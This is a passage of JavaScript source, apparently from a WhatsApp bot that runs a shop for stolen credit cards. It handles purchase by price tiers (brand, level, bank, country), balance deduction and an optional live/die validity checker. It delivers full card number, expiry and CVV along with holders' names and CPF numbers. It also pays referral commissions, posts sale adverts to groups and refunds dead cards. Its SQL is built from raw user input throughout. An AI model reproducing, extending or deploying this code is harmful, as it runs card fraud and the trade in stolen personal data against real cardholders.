        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_ID_Lista_Array_Partes[1] === "comprarcc") {

            if (Mensagem_ID_Lista_Array_Partes[2] === "1") {
                TIPOCC = "1"
            } else {
                TIPOCC = "2"
            }

            ID = Mensagem_ID_Lista_Array_Partes[3]

            NUMERO_CC = await DataBase_Better.prepare(`SELECT NUMERO FROM CCS WHERE _rowid_ = '${ID}'`).get()
            if (NUMERO_CC === undefined) {
                Texto = `*ESTA CC NÃO ESTÁ MAIS NO ESTOQUE, PODE TER SIDO COMPRADA POR OUTRO, OU ATÉ MESMO REMOVIDA POR ESTAR DIE.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
            if (TIPOCC.toString() === "1") {
                Full = ""
            } else {
                Full = "_FULL"
            }
            NUMERO_CC = NUMERO_CC["NUMERO"]
            Digito = NUMERO_CC.match(/./igm)
            BIN = `${Digito[0]}${Digito[1]}${Digito[2]}${Digito[3]}${Digito[4]}${Digito[5]}`
            console.log(BIN)
            VALOR_FINAL_CC = await DataBase_Better.prepare(`SELECT
CCS.*,
CCS_PRECOS_BANDEIRA${Full}.VALOR AS VL_BANDEIRA,
CCS_PRECOS_NIVEL${Full}.VALOR AS VL_NIVEL,
CCS_PRECOS_BANCO${Full}.VALOR AS VL_BANCO,
CCS_PRECOS_PAIS${Full}.VALOR AS VL_PAIS,
(
CCS_PRECOS_BANDEIRA${Full}.VALOR + CCS_PRECOS_NIVEL${Full}.VALOR + CCS_PRECOS_BANCO${Full}.VALOR + CCS_PRECOS_PAIS${Full}.VALOR
) AS VL_TOTAL
FROM
CCS
LEFT JOIN CCS_PRECOS_BANDEIRA${Full} ON (
CCS.BANDEIRA = CCS_PRECOS_BANDEIRA${Full}.BANDEIRA
)

LEFT JOIN CCS_PRECOS_NIVEL${Full} ON (
CCS.NIVEL = CCS_PRECOS_NIVEL${Full}.NIVEL
)

LEFT JOIN CCS_PRECOS_BANCO${Full} ON (
CCS.BANCO = CCS_PRECOS_BANCO${Full}.BANCO
)

LEFT JOIN CCS_PRECOS_PAIS${Full} ON (
CCS.PAIS = CCS_PRECOS_PAIS${Full}.PAIS
)

LEFT JOIN CCS_PRECOS_BIN${Full} ON (
CCS.BIN = CCS_PRECOS_BIN${Full}.BIN
)
WHERE CCS_PRECOS_BIN${Full}.BIN = '${BIN}' LIMIT 1`).all()
            //console.log(`VALOR TOTAL DA BIN:${BIN} | R$:${VALOR_FINAL_CC[0]["VL_TOTAL"]}`)
            VALOR_FINAL_CC = VALOR_FINAL_CC[0]["VL_TOTAL"]

            if (parseFloat(VALOR_FINAL_CC) === 0 || parseFloat(VALOR_FINAL_CC) === 0.00) {

                Texto = `⚠️ *Não foi possível efetuar a compra desta CC, pois o valor da mesma não foi definida. Nossa equipe foi notificada!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                NIVEL_CC = await DataBase_Better.prepare(`SELECT NIVEL FROM CCS WHERE _rowid_ = '${ID}'`).get()["NIVEL"]

                Texto = `⚠️ *ATENÇÃO ADM* ⚠️

Usuário: wa.me/${Numero}

Tentou comprar uma *${NIVEL_CC}* que não possui preço definido.

REVISE AS TABELAS DE PREÇOS E DEFINA OS PREÇOS DAS CCs COM CUSTO R$:0`
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
            SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);
            if (parseFloat(SALDO_USUARIO) < parseFloat(VALOR_FINAL_CC)) {

                Texto = `⚠️ *Você não possui saldo suficiente para comprar esta CC.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            BIN_CC = await DataBase_Better.prepare(`SELECT BIN FROM CCS WHERE _rowid_ = '${ID}'`).get()["BIN"]
            MES_CC = await DataBase_Better.prepare(`SELECT MES FROM CCS WHERE _rowid_ = '${ID}'`).get()["MES"]
            ANO_CC = await DataBase_Better.prepare(`SELECT ANO FROM CCS WHERE _rowid_ = '${ID}'`).get()["ANO"]
            CVV_CC = await DataBase_Better.prepare(`SELECT CVV FROM CCS WHERE _rowid_ = '${ID}'`).get()["CVV"]
            BANDEIRA_CC = await DataBase_Better.prepare(`SELECT BANDEIRA FROM CCS WHERE _rowid_ = '${ID}'`).get()["BANDEIRA"]
            TIPO_CC = await DataBase_Better.prepare(`SELECT TIPO FROM CCS WHERE _rowid_ = '${ID}'`).get()["TIPO"]
            NIVEL_CC = await DataBase_Better.prepare(`SELECT NIVEL FROM CCS WHERE _rowid_ = '${ID}'`).get()["NIVEL"]
            BANCO_CC = await DataBase_Better.prepare(`SELECT BANCO FROM CCS WHERE _rowid_ = '${ID}'`).get()["BANCO"]
            PAIS_CC = await DataBase_Better.prepare(`SELECT PAIS FROM CCS WHERE _rowid_ = '${ID}'`).get()["PAIS"]
            DADOS_CC = await DataBase_Better.prepare(`SELECT DADOS FROM CCS WHERE _rowid_ = '${ID}'`).get()["DADOS"]

            if (DADOS_CC.toString() === "#") {
                Array_Dados = await Obter_Nome_CPF()
                DADOS_CC = `NOME:${Array_Dados[0]["NOME"]}
CPF:${Array_Dados[0]["CPF"]}`
            }

            ATIVAR_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_CHK'`).get()["VALOR"]
            CHK_PALAVRA_LIVE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE'`).get()["VALOR"]
            CHK_PALAVRA_LIVE2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE2'`).get()["VALOR"]
            CHK_PALAVRA_LIVE3 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE3'`).get()["VALOR"]
            CHK_PALAVRA_DIE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE'`).get()["VALOR"]
            CHK_PALAVRA_DIE2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE2'`).get()["VALOR"]
            CHK_PALAVRA_DIE3 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE3'`).get()["VALOR"]
            ATIVAR_REEMBOLSO_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_REEMBOLSO_CHK'`).get()["VALOR"]

            Retorno = ""
            if (ATIVAR_CHK === "1") {
                USO_APIS_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'USO_APIS_CHK'`).get()["VALOR"]
                if (USO_APIS_CHK === "0") {
                    await DataBase_Better.prepare(`INSERT INTO CHECAR_CC_V2 (
CONTATO,
CC,
TIPOCC,
DADOS_CHECAGEM,
RESULTADO_CHK,
PROCESSADO,
VALOR_CC,
DATA_INSERIDO_MS) VALUES (
'${Mensagem_From}',
'${NUMERO_CC}|${MES_CC}|${ANO_CC}|${CVV_CC}',
'${TIPOCC}',
'0',
'0',
'2',
'${VALOR_FINAL_CC}',
'${Date.now()}')`).run()

                } else {

                    await DataBase_Better.prepare(`INSERT INTO CHECAR_CC_V2 (
CONTATO,
CC,
TIPOCC,
DADOS_CHECAGEM,
RESULTADO_CHK,
PROCESSADO,
VALOR_CC,
DATA_INSERIDO_MS) VALUES (
'${Mensagem_From}',
'${NUMERO_CC}|${MES_CC}|${ANO_CC}|${CVV_CC}',
'${TIPOCC}',
'0',
'0',
'1',
'${VALOR_FINAL_CC}',
'${Date.now()}')`).run()

                    Texto = `🔎 *Checando CC...* 💳`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
            }

            NOVO_SALDO = parseFloat(SALDO_USUARIO) - parseFloat(VALOR_FINAL_CC)
            NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2)
            await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()

            VALOR_BASE_INDIC = VALOR_FINAL_CC
            Contato_Temp_Indic = Mensagem_From
            FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
            if (FUNCAO_ASSOCIADOS_PAGO === "1") {
                ATIVAR_ASSOCIADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).get()["VALOR"]
                if (ATIVAR_ASSOCIADOS === "1") {

                    Ja_tem_Indicador = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()
                    if (Ja_tem_Indicador["NUMERO_INDICADOR"] != "0") {
                        NUMERO_INDICADOR = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()["NUMERO_INDICADOR"]
                        PERCENTUAL_ADICIONAL_ASSOCIADO = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                        if (PERCENTUAL_ADICIONAL_ASSOCIADO.toString() != "0") {
                            PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                        } else {
                            PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PERCENTUAL_ASSO_GERAL'`).get()["VALOR"]
                        }

                        PIX_OU_COMPRA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PIX_OU_COMPRA'`).get()["VALOR"]
                        if (PIX_OU_COMPRA === "1") {

                        } else if (PIX_OU_COMPRA === "2") {
                            VALOR_ADD_INDICADOR = ((parseFloat(PERCENTUAL_FINAL) * parseFloat(VALOR_BASE_INDIC)) / 100);
                            VALOR_ADD_INDICADOR = parseFloat(VALOR_ADD_INDICADOR).toFixed(2)
                            console.log(`VALOR_ADD_INDICADOR: ${VALOR_ADD_INDICADOR}`)

                            SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["SALDO_INDICACAO"]
                            SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2)
                            console.log(`SALDO_INDICACAO: ${SALDO_INDICACAO}`)

                            NOVO_SALDO_INDICACAO = parseFloat(SALDO_INDICACAO) + parseFloat(VALOR_ADD_INDICADOR)
                            NOVO_SALDO_INDICACAO = parseFloat(NOVO_SALDO_INDICACAO).toFixed(2)
                            console.log(`NOVO_SALDO_INDICACAO: ${NOVO_SALDO_INDICACAO}`)

                            await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO_INDICACAO = '${NOVO_SALDO_INDICACAO}' WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).run()
                            console.log(`Indicador:${NUMERO_INDICADOR} ganhou R$:${VALOR_ADD_INDICADOR}`)
                        }
                    }
                }
            }

            await DataBase_Better.prepare(`INSERT INTO CCs_Vendidas (
NUMERO,
MES,
ANO,
CVV,
BANDEIRA,
TIPO,
NIVEL,
BANCO,
PAIS,
DADOS,
TIPOCC,
Data_MS_Inserido,
VALOR,
NUMERO_COMPRADOR) VALUES (
'${NUMERO_CC}',
'${MES_CC}',
'${ANO_CC}',
'${CVV_CC}',
'${BANDEIRA_CC}',
'${TIPO_CC}',
'${NIVEL_CC}',
'${BANCO_CC}',
'${PAIS_CC}',
'${DADOS_CC}',
'${TIPOCC}',
'${Date.now()}',
'${VALOR_FINAL_CC}',
'${Mensagem_From}')`
            ).run()
            await DataBase_Better.prepare(`DELETE FROM CCS WHERE NUMERO == ${NUMERO_CC}`).run()

            MENSAGEM_AO_COMPRAR_CC = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_CC'`).get()["VALOR"]

            Texto_Usuario = `💳 *SUCESSO CC COMPRADA* 💳

⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString()}
💰 *VALOR CC:* R$: ${VALOR_FINAL_CC}

💳 *CARTÃO:* ${NUMERO_CC}|${MES_CC}|${ANO_CC}|${CVV_CC}
🏳️ *BANDEIRA:* ${BANDEIRA_CC}
⚜️ *TIPO:* ${TIPO_CC}
💠 *NIVEL:* ${NIVEL_CC}
🏛 *BANCO:* ${BANCO_CC}
🌍 *PAIS:* ${PAIS_CC}

👤 *DADOS:* ${DADOS_CC}

═══════❖═══════
${MENSAGEM_AO_COMPRAR_CC}


*Mandei os dados da CC em uma mensagem separada, para que você copie com mais facilidade.*`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}', 
'sendImage',
'${Texto_Usuario}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Comprou_CC_PV}',
'${Date.now()}')`).run()

            NOT_COMPROU_CC = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_CC'`).get()["VALOR"]
            if (NOT_COMPROU_CC === "1") {

                Texto_Grupo = `💳 *USUÁRIO COMPROU UMA CC* 💳

👤 *USUÁRIO:* wa.me/${Numero}

💳 *CARTÃO:* ****************|${MES_CC}|${ANO_CC}|***
🏳️ *BANDEIRA:* ${BANDEIRA_CC}
⚜️ *TIPO:* ${TIPO_CC}
💠 *NIVEL:* ${NIVEL_CC}
🏛 *BANCO:* ${BANCO_CC}
🌍 *PAIS:* ${PAIS_CC}

────────────────

*VENHA ADQUIRIR AS MELHORES CCs DA NET!*

*ATENDIMENTO 100% AUTOMÁTICO!*

Este é o número do BOT, mande qualquer mensagem!
wa.me/${NUMERO_PURO_BOT}`
                for await (Grupo of ID_GRUPOS) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Grupo["ID_GRUPO"]}', 
'sendImage',
'${Texto_Grupo}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Comprou_CC_GP}',
'${Date.now()}')`).run()
                }
            }

            Texto_chk = ""
            if (ATIVAR_CHK === "1") {
                Texto_chk = `*PALAVRA QUANDO DA LIVE:* ${CHK_PALAVRA_LIVE}
*PALAVRA QUANDO DA DIE:* ${CHK_PALAVRA_DIE}

*RETORNO DA API:*

${Retorno}`
            }
            Texto_Adms = `🔱 *CC COMPRADA COM SUCESSO* 🔱

👤 *NÚMERO DO USUÁRIO:* wa.me/${Numero}
💰 *VALOR CC:* R$: ${VALOR_FINAL_CC}

💳 *CARTÃO:* ${NUMERO_CC}|${MES_CC}|${ANO_CC}|${CVV_CC}
🏳️ *BANDEIRA:* ${BANDEIRA_CC}
⚜️ *TIPO:* ${TIPO_CC}
💠 *NIVEL:* ${NIVEL_CC}
🏛 *BANCO:* ${BANCO_CC}
🌍 *PAIS:* ${PAIS_CC}

👤 *DADOS:* ${DADOS_CC}

${Texto_chk}`
            for await (adm of Adms) {
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto_Adms}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            }

            ATIVAR_REEMBOLSO_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_REEMBOLSO_CHK'`).get()["VALOR"]
            if (ATIVAR_REEMBOLSO_CHK === "1") {

                CONSTRUCAO_LISTMESSAGE_buttonText = "REEMBOLSAR"
                CONSTRUCAO_LISTMESSAGE_title = `REEMBOLSAR`
                CONSTRUCAO_LISTMESSAGE_description = `${NUMERO_CC}|${MES_CC}|${ANO_CC}|${CVV_CC}`

                CONSTRUCAO_LISTMESSAGE_rows = []
                iD_Footer = Date.now()

                CONSTRUCAO_LISTMESSAGE_rows.push(
                    {
                        rowId: `${iD_Footer.toString()}|liberar_esta_interacao_se_for_antiga|ccs_reembolsar`,
                        title: "🔄 REEMBOLSAR",
                        description: "Checaremos novamente esta CC, se estiver Die, você será reembolsado.",
                    },
                )
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"))
            } else {
                Texto = `${NUMERO_CC}|${MES_CC}|${ANO_CC}|${CVV_CC}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            }

            console.log(`CC Comprada! Numero: wa.me/${Numero} | Valor: ${VALOR_FINAL_CC}`)
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳




        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_ID_Lista_Array_Partes[2] === "ccs_reembolsar") {

            ATIVAR_REEMBOLSO_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_REEMBOLSO_CHK'`).get()["VALOR"]
            if (ATIVAR_REEMBOLSO_CHK != "1") {
                Texto = `*SISTEMA DE REEMBOLSO DESATIVADO PELO ADM.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            ITEM_FILA_CHK_REEMBOLSO = await DataBase_Better.prepare(`SELECT _rowid_ FROM CHECAR_CC_V2 WHERE CONTATO = '${Mensagem_From}'`).get()

            if (ITEM_FILA_CHK_REEMBOLSO === undefined) {
                Texto = `⚠️ *VOCÊ NÃO POSSUI CCs A REEMBOLSAR.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            ITEM_FILA_CHK_REEMBOLSO = await DataBase_Better.prepare(`SELECT 
_rowid_,* FROM CHECAR_CC_V2 WHERE CONTATO = '${Mensagem_From}' ORDER BY DATA_INSERIDO_MS DESC LIMIT 1`).get()

            if (ITEM_FILA_CHK_REEMBOLSO["PROCESSADO"] === "8") {
                Texto = `⚠️ *VOCÊ JÁ USOU A OPÇÃO DE REEMBOLSO, NÃO É POSSÍVEL UTILIZAR NOVAMENTE NA ULTIMA CC COMPRADA.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            MINIMO_TEMPO_REEMBOLSO_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MINIMO_TEMPO_REEMBOLSO_CHK'`).get()["VALOR"]
            timeParts = `00:${MINIMO_TEMPO_REEMBOLSO_CHK}`.split(":")
            //console.log((+timeParts[0] * (60000 * 60)) + (+timeParts[1] * 60000))
            MINIMO_TEMPO_REEMBOLSO_MS = (+timeParts[0] * (60000 * 60)) + (+timeParts[1] * 60000)

            Data_MS_Inserido_Ultima_CC = await DataBase_Better.prepare(`SELECT DATA_INSERIDO_MS FROM CHECAR_CC_V2 WHERE CONTATO = '${Mensagem_From}' ORDER BY DATA_INSERIDO_MS DESC LIMIT 1`).get()
            Data_MS_Inserido_Ultima_CC = Data_MS_Inserido_Ultima_CC["DATA_INSERIDO_MS"]

            console.log(Date.now())
            console.log(Data_MS_Inserido_Ultima_CC)
            console.log(parseInt(Data_MS_Inserido_Ultima_CC) + parseInt(MINIMO_TEMPO_REEMBOLSO_MS))
